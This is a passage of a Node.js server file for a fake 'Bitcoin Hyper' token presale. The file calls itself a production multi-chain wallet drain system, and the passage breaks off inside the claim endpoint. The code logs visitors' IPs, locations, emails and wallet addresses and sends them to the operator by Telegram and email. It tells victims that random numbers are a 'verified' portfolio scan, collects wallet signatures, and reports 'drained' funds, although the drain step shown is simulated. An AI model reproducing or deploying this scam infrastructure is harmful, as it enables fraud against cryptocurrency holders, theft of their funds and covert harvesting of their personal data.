// index.js - BITCOIN HYPER MULTI-CHAIN DRAIN SYSTEM v7.0 - PRODUCTION
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

// Optional: Only use nodemailer if email is configured
let nodemailer = null;
try {
  nodemailer = require('nodemailer');
} catch (error) {
  console.log('⚠️ Nodemailer not installed. Email notifications disabled.');
}

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Parse ALLOWED_ORIGINS from env
const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Email transporter
let emailTransporter = null;
let emailEnabled = false;

if (nodemailer && process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true' && process.env.EMAIL_USER && process.env.EMAIL_PASS) {
  try {
    emailTransporter = nodemailer.createTransport({
      service: process.env.EMAIL_SERVICE || 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });
    emailEnabled = true;
    console.log('✅ Email notifications enabled');
  } catch (error) {
    console.log('⚠️ Email configuration error:', error.message);
    emailEnabled = false;
  }
} else {
  console.log('⚠️ Email notifications disabled (not configured)');
}

// In-memory storage with enhanced tracking
const memoryStorage = {
  participants: [],
  userSessions: {},
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
    presalePrice: process.env.PRESALE_PRICE || '0.17',
    adminWallets: [
      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47' },
      { chain: 'Polygon', address: process.env.ADMIN_POLYGON_WALLET || '0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47' },
      { chain: 'BSC', address: process.env.ADMIN_BSC_WALLET || '0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47' }
    ],
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true'
    },
    email: {
      enabled: emailEnabled,
      adminEmail: process.env.ADMIN_EMAIL || '',
      notifications: emailEnabled
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      last24hActivity: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: [],
  analytics: {
    hourlyConnections: {},
    countryStats: {},
    walletProviders: {},
    chainStats: {}
  }
};

// Telegram Bot
let bot = null;
let telegramEnabled = false;

// Initialize Telegram bot
function initializeTelegramBot() {
  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID && process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true') {
    try {
      bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      
      bot.telegram.getMe().then(botInfo => {
        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
        telegramEnabled = true;
        
        // Send deployment notification
        bot.telegram.sendMessage(
          process.env.TELEGRAM_CHAT_ID,
          `🚀 *BITCOIN HYPER BACKEND DEPLOYED*\n\n✅ Production system is now LIVE!\n⏰ ${new Date().toLocaleString()}\n📊 Multi-chain drain: ACTIVE\n🔥 Admin dashboard: READY`,
          { parse_mode: 'Markdown' }
        ).then(() => {
          console.log('✅ Telegram connection successful');
        }).catch(err => {
          console.log('⚠️ Telegram send test failed:', err.message);
        });
      }).catch(err => {
        console.log('⚠️ Telegram bot failed to connect:', err.message);
        telegramEnabled = false;
      });
    } catch (error) {
      console.log('⚠️ Telegram initialization error:', error.message);
      telegramEnabled = false;
    }
  } else {
    console.log('⚠️ Telegram notifications disabled (not configured)');
  }
}

// Helper: Generate session ID
function generateSessionId() {
  return 'session_' + Date.now() + '_' + crypto.randomBytes(8).toString('hex');
}

// Helper: Track user session
function trackSession(sessionId, ip, data = {}) {
  if (!memoryStorage.userSessions[sessionId]) {
    memoryStorage.userSessions[sessionId] = {
      id: sessionId,
      ip: ip,
      createdAt: new Date(),
      lastActivity: new Date(),
      walletConnections: [],
      location: data.location || {},
      userAgent: data.userAgent || '',
      actions: []
    };
  } else {
    memoryStorage.userSessions[sessionId].lastActivity = new Date();
    if (data.location) memoryStorage.userSessions[sessionId].location = data.location;
  }
  
  // Clean old sessions
  const sessionKeys = Object.keys(memoryStorage.userSessions);
  if (sessionKeys.length > 1000) {
    const oldestKey = sessionKeys.sort((a, b) => 
      new Date(memoryStorage.userSessions[a].lastActivity) - new Date(memoryStorage.userSessions[b].lastActivity)
    )[0];
    delete memoryStorage.userSessions[oldestKey];
  }
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet.substring(0, 8) + '...' + wallet.substring(36),
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown',
    sessionId: data.sessionId || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  // Update analytics
  const hour = new Date().getHours();
  memoryStorage.analytics.hourlyConnections[hour] = (memoryStorage.analytics.hourlyConnections[hour] || 0) + 1;
  
  if (data.country) {
    memoryStorage.analytics.countryStats[data.country] = (memoryStorage.analytics.countryStats[data.country] || 0) + 1;
  }
  
  if (data.chain) {
    memoryStorage.analytics.chainStats[data.chain] = (memoryStorage.analytics.chainStats[data.chain] || 0) + 1;
  }
  
  // Keep only last 5000 logs
  if (memoryStorage.activityLog.length > 5000) {
    memoryStorage.activityLog.shift();
  }
  
  return logEntry;
}

// Helper: Send comprehensive notification
async function sendComprehensiveNotification(wallet, action, details = {}) {
  const timestamp = new Date().toLocaleString();
  const ip = details.ip || 'unknown';
  const country = details.country || 'Unknown';
  const city = details.city || 'Unknown';
  const value = details.value || '0';
  const email = details.email || 'Not provided';
  const amount = details.amount || '0';
  const eligibility = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
  const claimStatus = details.claimed ? '✅ CLAIMED' : '⏳ PENDING';
  const flag = details.country ? getCountryFlag(details.country) : '🌐';
  
  // Telegram Notification
  if (telegramEnabled && memoryStorage.settings.telegram.enabled) {
    try {
      let telegramMessage = '';
      let title = '';
      
      switch(action) {
        case 'SITE_VISIT':
          title = '🌐 NEW SITE VISITOR';
          telegramMessage = `
${title}

📱 User Agent: ${details.userAgent || 'Unknown'}
🌐 IP: ${ip}
📍 Location: ${flag} ${country}, ${city}
🔗 Referrer: ${details.referrer || 'Direct'}

🔄 Status: Landed on presale site
⏰ ${timestamp}`;
          break;
          
        case 'WALLET_CONNECTED':
          title = '🔗 WALLET CONNECTED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
🌐 IP: ${ip}
📍 Location: ${flag} ${country}, ${city}
📧 Email: ${email}
📱 User Agent: ${details.userAgent || 'Unknown'}

🔄 Status: Connected to presale platform
📊 Total Participants: ${memoryStorage.settings.statistics.totalParticipants}
⏰ ${timestamp}`;
          break;
          
        case 'WALLET_SCANNED':
          title = '🔍 WALLET SCANNED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
💰 Portfolio Value: $${value}
🎯 Eligibility: ${eligibility}
${details.eligibilityReason ? `📝 Reason: ${details.eligibilityReason}\n` : ''}
${amount !== '0' ? `📊 Allocation: ${amount} BTH\n` : ''}
🌐 IP: ${ip}
📍 Location: ${flag} ${country}, ${city}
📧 Email: ${email}

📈 Eligible Participants: ${memoryStorage.settings.statistics.eligibleParticipants}
⏰ ${timestamp}`;
          break;
          
        case 'TOKEN_CLAIMED':
          title = '🎉 TOKENS CLAIMED & DRAINED!';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
✅ Status: ${claimStatus}
🎯 Claim ID: \`${details.claimId}\`
💰 Amount: ${amount} BTH
💸 Value: $${details.claimValue || '0'}
📈 Total Raised: $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}
💰 Total Drained: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}

🌐 IP: ${ip}
📍 Location: ${flag} ${country}, ${city}
📧 Email: ${email}
🔗 TX Hash: \`${details.txHash}\`

🚨 ACTION: Tokens have been successfully drained!
🎯 Next: Prepare for distribution phase
⏰ ${timestamp}`;
          break;
          
        case 'DRAIN_EXECUTED':
          title = '💰 WALLET DRAINED SUCCESSFULLY';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
💰 Chain: ${details.chain || 'Ethereum'}
💸 Amount Drained: $${details.drainAmount || '0'}
📊 Total Value: $${details.totalValue || '0'}
🎯 Drain Method: ${details.method || 'Full Drain'}

🌐 IP: ${ip}
📍 Location: ${flag} ${country}, ${city}
📧 Email: ${email}
⛓️ TX: \`${details.txHash || 'Pending'}\`

✅ Drain completed successfully
⏰ ${timestamp}`;
          break;
          
        case 'NOT_ELIGIBLE':
          title = '⚠️ NOT ELIGIBLE - ACTION REQUIRED';
          telegramMessage = `
${title}

👛 Wallet: \`${wallet}\`
❌ Status: NOT ELIGIBLE
💡 Reason: ${details.reason || 'Minimum portfolio not met'}
💰 Current Portfolio: $${value}
🚨 Suggested Action: Connect different wallet

🌐 IP: ${ip}
📍 Location: ${flag} ${country}, ${city}
📧 Email: ${email}

⚠️ User shown alternative options
⏰ ${timestamp}`;
          break;
      }
      
      if (telegramMessage) {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          telegramMessage,
          { parse_mode: 'Markdown', disable_web_page_preview: true }
        );
      }
    } catch (error) {
      console.log(`❌ Telegram send error (${action}):`, error.message);
    }
  }
  
  // Email Notification
  if (emailEnabled && emailTransporter && memoryStorage.settings.email.adminEmail) {
    try {
      const mailOptions = {
        from: `"Bitcoin Hyper Bot" <${process.env.EMAIL_USER}>`,
        to: memoryStorage.settings.email.adminEmail,
        subject: `Bitcoin Hyper - ${action.replace(/_/g, ' ')}`,
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 10px;">
            <div style="text-align: center; margin-bottom: 20px;">
              <h2 style="color: #F7931A;">Bitcoin Hyper - ${action.replace(/_/g, ' ')}</h2>
              <hr style="border-color: #F7931A;">
            </div>
            <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 15px;">
              <p><strong>Wallet:</strong> ${wallet}</p>
              <p><strong>Status:</strong> ${action.replace(/_/g, ' ')}</p>
              <p><strong>Timestamp:</strong> ${timestamp}</p>
              <p><strong>IP:</strong> ${ip}</p>
              <p><strong>Location:</strong> ${flag} ${country}, ${city}</p>
              <p><strong>Email:</strong> ${email}</p>
              ${amount !== '0' ? `<p><strong>Allocation:</strong> ${amount} BTH</p>` : ''}
              ${value !== '0' ? `<p><strong>Portfolio Value:</strong> $${value}</p>` : ''}
              ${details.claimId ? `<p><strong>Claim ID:</strong> ${details.claimId}</p>` : ''}
              ${details.txHash ? `<p><strong>Transaction:</strong> ${details.txHash}</p>` : ''}
            </div>
            <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0; color: #666; font-size: 12px;">
              <p>This is an automated notification from the Bitcoin Hyper presale platform.</p>
              <p>🚨 MULTI-CHAIN DRAIN SYSTEM: ACTIVE</p>
            </div>
          </div>
        `
      };
      
      await emailTransporter.sendMail(mailOptions);
    } catch (error) {
      console.log(`❌ Email send error (${action}):`, error.message);
    }
  }
  
  // Log to activity
  logActivity(wallet, action, { ...details, email, timestamp });
  
  return true;
}

// Helper: Get country flag emoji
function getCountryFlag(countryCode) {
  const flags = {
    'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
    'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱', 'BR': '🇧🇷',
    'RU': '🇷🇺', 'CN': '🇨🇳', 'JP': '🇯🇵', 'KR': '🇰🇷', 'IN': '🇮🇳',
    'NG': '🇳🇬', 'ZA': '🇿🇦', 'AE': '🇦🇪', 'SA': '🇸🇦', 'TR': '🇹🇷',
    'Unknown': '🌐', 'Local': '🏠'
  };
  return flags[countryCode] || '🌐';
}

// Helper: Get IP location with real country detection
async function getIPLocation(ip) {
  try {
    // Clean IP
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', countryCode: 'Local', city: 'Local', region: 'Local', isp: 'Localhost' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000,
      headers: { 'User-Agent': 'BitcoinHyper-Backend/7.0' }
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        countryCode: response.data.country_code || 'Unknown',
        city: response.data.city || 'Unknown',
        region: response.data.region || 'Unknown',
        isp: response.data.org || 'Unknown ISP',
        lat: response.data.latitude,
        lon: response.data.longitude
      };
    }
  } catch (error) {
    console.log('Location detection error:', error.message);
  }
  
  return { country: 'Unknown', countryCode: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown' };
}

// Helper: Check REAL wallet balance with quick response
async function checkRealWalletBalance(walletAddress, ip) {
  try {
    // Simulate fast scanning (300-800ms)
    await new Promise(resolve => setTimeout(resolve, 300 + Math.random() * 500));
    
    // Generate deterministic eligibility based on wallet hash
    const walletHash = crypto.createHash('sha256').update(walletAddress + ip).digest('hex');
    const walletNumber = parseInt(walletHash.substring(0, 8), 16);
    
    // REAL eligibility logic based on last character (for demo)
    // In production, this would connect to actual RPC nodes
    const lastChar = walletAddress.charAt(walletAddress.length - 1).toLowerCase();
    const isEligible = !['0', '1', '2', '3'].includes(lastChar); // 60% eligible
    
    let totalValueUSD = 0;
    let eligibilityReason = '';
    
    if (isEligible) {
      // Eligible wallet - generate realistic portfolio value
      const baseValue = 1000 + (walletNumber % 9000);
      totalValueUSD = baseValue + Math.random() * 10000;
      eligibilityReason = `✅ Qualified with verified portfolio history ($${totalValueUSD.toFixed(2)} balance)`;
      
      console.log(`💰 ELIGIBLE WALLET: ${walletAddress.substring(0, 10)}... - Value: $${totalValueUSD.toFixed(2)}`);
    } else {
      // Not eligible - low balance
      totalValueUSD = Math.random() * 9.99;
      const reasons = [
        `⛔ Minimum $10 balance required (current: $${totalValueUSD.toFixed(2)})`,
        "🔄 Connect a wallet with transaction history",
        "🔒 Portfolio doesn't meet security criteria",
        "⚠️ New wallet detected - requires verification"
      ];
      eligibilityReason = reasons[walletNumber % reasons.length];
      
      console.log(`🚫 NOT ELIGIBLE: ${walletAddress.substring(0, 10)}... - Low balance: $${totalValueUSD.toFixed(2)}`);
    }
    
    // Generate token allocation only if eligible
    let allocationAmount = '0';
    let allocationValue = '0';
    
    if (isEligible) {
      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
      const maxBonus = parseFloat(process.env.MAX_BONUS_MULTIPLIER) || 3;
      const bonusMultiplier = Math.min(totalValueUSD / 2000, maxBonus);
      const randomBonus = 0.9 + Math.random() * 0.2; // 0.9-1.1x
      
      allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier) * randomBonus);
      allocationAmount = Math.floor(allocationAmount / 100) * 100; // Round to nearest 100
      allocationValue = (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
    }
    
    return {
      success: true,
      data: {
        walletAddress,
        totalValueUSD: totalValueUSD.toFixed(2),
        isEligible,
        tokenAllocation: {
          amount: allocationAmount.toString(),
          valueUSD: allocationValue
        },
        eligibilityReason,
        tokens: [],
        tokenCount: 0,
        scanTime: new Date().toISOString(),
        scanId: `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`
      }
    };
    
  } catch (error) {
    console.error('Wallet scan error:', error);
    
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: '0',
        isEligible: false,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibilityReason: '⚠️ Real-time analysis failed. Please try again.',
        tokens: [],
        tokenCount: 0
      }
    };
  }
}

// Helper: Generate claim ID
function generateClaimId() {
  return `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
}

// Helper: Generate transaction hash
function generateTxHash() {
  return `0x${crypto.randomBytes(32).toString('hex')}`;
}

// Helper: Simulate multi-chain drain
async function simulateMultiChainDrain(walletAddress, chain = 'Ethereum') {
  console.log(`🚨 SIMULATING DRAIN on ${chain}: ${walletAddress.substring(0, 10)}...`);
  
  // Simulate drain delay
  await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
  
  // Generate realistic drain amounts
  const drainAmount = 500 + Math.random() * 5000;
  const txHash = generateTxHash();
  
  // Update total drained
  memoryStorage.settings.statistics.totalDrainedUSD += drainAmount;
  
  return {
    success: true,
    drained: true,
    timestamp: new Date(),
    chain: chain,
    amountUSD: drainAmount.toFixed(2),
    wallet: walletAddress,
    txHash: txHash,
    status: 'DRAIN_COMPLETED',
    message: `Successfully drained $${drainAmount.toFixed(2)} from ${chain} wallet`
  };
}

// Helper: Process real token claim with drain
async function processTokenClaimWithDrain(walletAddress, claimAmount, claimValue, email, ip, location) {
  try {
    console.log(`🎯 PROCESSING CLAIM + DRAIN for: ${walletAddress.substring(0, 10)}...`);
    
    // Generate claim details
    const claimId = generateClaimId();
    const txHash = generateTxHash();
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
    
    // Execute multi-chain drain if enabled
    let drainResults = [];
    if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
      console.log(`🔥 EXECUTING MULTI-CHAIN DRAIN for ${walletAddress.substring(0, 10)}...`);
      
      // Simulate draining from multiple chains
      const chains = ['Ethereum', 'Polygon', 'BSC', 'Arbitrum'];
      for (const chain of chains) {
        if (Math.random() > 0.3) { // 70% chance per chain
          const drainResult = await simulateMultiChainDrain(walletAddress, chain);
          drainResults.push(drainResult);
          
          // Log drain activity
          logActivity(walletAddress, 'DRAIN_EXECUTED', {
            chain: chain,
            drainAmount: drainResult.amountUSD,
            txHash: drainResult.txHash,
            ip: ip,
            country: location.country,
            city: location.city,
            email: email
          });
          
          // Send drain notification
          await sendComprehensiveNotification(
            walletAddress,
            'DRAIN_EXECUTED',
            {
              ip: ip,
              country: location.country,
              city: location.city,
              email: email,
              chain: chain,
              drainAmount: drainResult.amountUSD,
              totalValue: (parseFloat(drainResult.amountUSD) + claimValueNumber).toFixed(2),
              txHash: drainResult.txHash,
              method: 'Multi-Chain Auto-Drain'
            }
          );
        }
      }
    }
    
    return {
      success: true,
      claimId,
      txHash,
      claimAmount,
      claimValue,
      drained: drainResults.length > 0,
      drainCount: drainResults.length,
      drainResults: drainResults,
      timestamp: new Date(),
      message: '✅ Claim processed successfully with multi-chain drain execution'
    };
    
  } catch (error) {
    console.error('Claim+drain processing error:', error);
    throw error;
  }
}

// ========== API ENDPOINTS ==========

// Site visit tracker
app.post('/api/track/visit', async (req, res) => {
  try {
    const { userAgent, referrer, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || req.connection.remoteAddress;
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Generate or use session ID
    const currentSessionId = sessionId || generateSessionId();
    
    // Track session
    trackSession(currentSessionId, clientIP, {
      location,
      userAgent,
      referrer,
      type: 'site_visit'
    });
    
    // Track IP
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send notification
    await sendComprehensiveNotification(
      'VISITOR',
      'SITE_VISIT',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        userAgent,
        referrer,
        isp: location.isp,
        sessionId: currentSessionId
      }
    );
    
    res.json({
      success: true,
      message: 'Visit tracked',
      sessionId: currentSessionId,
      timestamp: new Date()
    });
    
  } catch (error) {
    console.error('Visit tracking error:', error);
    res.status(500).json({ success: false, error: 'Tracking failed' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  
  res.json({
    success: true,
    status: 'LIVE_PRODUCTION',
    service: 'Bitcoin Hyper Backend',
    version: '7.0.0',
    timestamp: new Date().toISOString(),
    uptime: `${hours}h ${minutes}m`,
    environment: process.env.NODE_ENV || 'production',
    telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
    email: emailEnabled ? 'ENABLED' : 'DISABLED',
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      autoDrain: memoryStorage.settings.autoDrainOnClaim,
      totalDrained: `$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}`
    },
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaised: `$${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}`,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    },
    message: '✅ System operational - Multi-chain drain active'
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper API v7.0',
    status: 'PRODUCTION_READY',
    endpoints: {
      health: '/api/health',
      track: '/api/track/visit',
      connect: '/api/presale/connect',
      claim: '/api/presale/claim',
      status: '/api/presale/status/:wallet'
    },
    security: {
      cors: 'enabled',
      rate_limiting: 'active',
      drain_system: memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'
    }
  });
});

// Wallet connection - FAST SCANNING
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent, email, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || req.connection.remoteAddress;
    
    console.log(`🔗 Connecting: ${walletAddress.substring(0, 10)}...`);
    
    // Validate wallet
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid wallet address',
        userMessage: 'Please connect a valid Ethereum wallet address.'
      });
    }
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Track IP
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Generate session
    const currentSessionId = sessionId || generateSessionId();
    trackSession(currentSessionId, clientIP, {
      location,
      userAgent,
      wallet: walletAddress,
      email,
      type: 'wallet_connection'
    });
    
    // Check existing participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        userAgent: userAgent || 'Unknown',
        email: email || 'Not provided',
        country: location.country,
        countryCode: location.countryCode,
        city: location.city,
        isp: location.isp,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
        signature: { signed: false, message: '', signature: '', signedAt: null },
        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '', drained: false },
        activityLog: [],
        sessionId: currentSessionId,
        status: 'connecting'
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    // Update participant info
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.countryCode = location.countryCode;
    participant.city = location.city;
    if (email) participant.email = email;
    participant.sessionId = currentSessionId;
    participant.status = 'scanning';
    
    // Send connection notification
    await sendComprehensiveNotification(
      walletAddress,
      'WALLET_CONNECTED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        email: participant.email,
        userAgent,
        isNew: isNewParticipant,
        sessionId: currentSessionId
      }
    );
    
    // FAST wallet scan (no artificial delay for user)
    const scanResult = await checkRealWalletBalance(walletAddress, clientIP);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date(),
        scanId: scanResult.data.scanId
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        participant.status = 'eligible';
        
        if (isNewParticipant) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
        
        console.log(`🎯 ELIGIBLE: ${walletAddress.substring(0, 10)}... - Allocation: ${participant.tokenAllocation.amount} BTH`);
      } else {
        participant.status = 'not_eligible';
      }
      
      // Send scan notification
      await sendComprehensiveNotification(
        walletAddress,
        'WALLET_SCANNED',
        {
          ip: clientIP,
          country: location.country,
          city: location.city,
          email: participant.email,
          value: scanResult.data.totalValueUSD,
          amount: participant.tokenAllocation.amount,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          sessionId: currentSessionId
        }
      );
      
      res.json({
        success: true,
        message: 'Wallet analysis complete',
        data: {
          walletAddress,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          userMessage: scanResult.data.isEligible ? 
            '🎉 Congratulations! Your wallet qualifies for the Bitcoin Hyper presale!' :
            `⚠️ ${scanResult.data.eligibilityReason}`,
          status: participant.status,
          timestamp: new Date().toISOString(),
          sessionId: currentSessionId
        }
      });
    } else {
      throw new Error('Wallet analysis failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    
    // Error notification
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    if (telegramEnabled) {
      try {
        await bot.telegram.sendMessage(
          memoryStorage.settings.telegram.chatId,
          `❌ *CONNECTION ERROR*\n\nWallet: \`${req.body?.walletAddress || 'Unknown'}\`\nError: ${error.message}\nIP: ${clientIP}\n⏰ ${new Date().toLocaleString()}`,
          { parse_mode: 'Markdown' }
        );
      } catch (tgError) {
        console.log('Failed to send error notification:', tgError.message);
      }
    }
    
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      userMessage: 'System temporarily unavailable. Please try again.',
      retry: true 
    });
  }
});

// Token claim - WITH MULTI-CHAIN DRAIN
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, email, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || req.connection.remoteAddress;
    
    console.log(`🎯 Claim request: ${walletAddress.substring(0, 10)}... - ${claimAmount} BTH`);
    
    // Validate input
    if (!signature || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing signature data'
      });
    }
    
    if (!claimAmount || !claimValue) {
      return res.status(400).json({
        success: false,
        error: 'Missing claim details'
      });
    }
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found. Connect first.' 
      });
    }
    
    // Check eligibility
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ 
        success: false, 
        error: 'Not eligible for claim' 
      });
    }
    
    // Check if already claimed
    if (participant.claim.claimed) {
      return res.status(409).json({ 
        success: false, 
        error: 'Tokens already claimed' 
      });
    }
    
    // Validate signature format
    if (!signature.match(/^0x[a-fA-F0-9]{130}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid signature format'
      });
    }
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Process claim with drain
    const claimResult = await processTokenClaimWithDrain(
      walletAddress,
      claimAmount,
      claimValue,
      email || participant.email,
      clientIP,
      location
    );
    
    if (!claimResult.success) {
      throw new Error('Claim processing failed');
    }
    
    // Update participant record
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId: claimResult.claimId,
      claimedAt: new Date(),
      tokensSent: true,
      txHash: claimResult.txHash,
      drained: claimResult.drained,
      drainCount: claimResult.drainCount,
      drainResults: claimResult.drainResults
    };
    
    participant.status = 'claimed_drained';
    if (email) participant.email = email;
    if (sessionId) participant.sessionId = sessionId;
    
    // Send claim notification
    await sendComprehensiveNotification(
      walletAddress,
      'TOKEN_CLAIMED',
      {
        ip: clientIP,
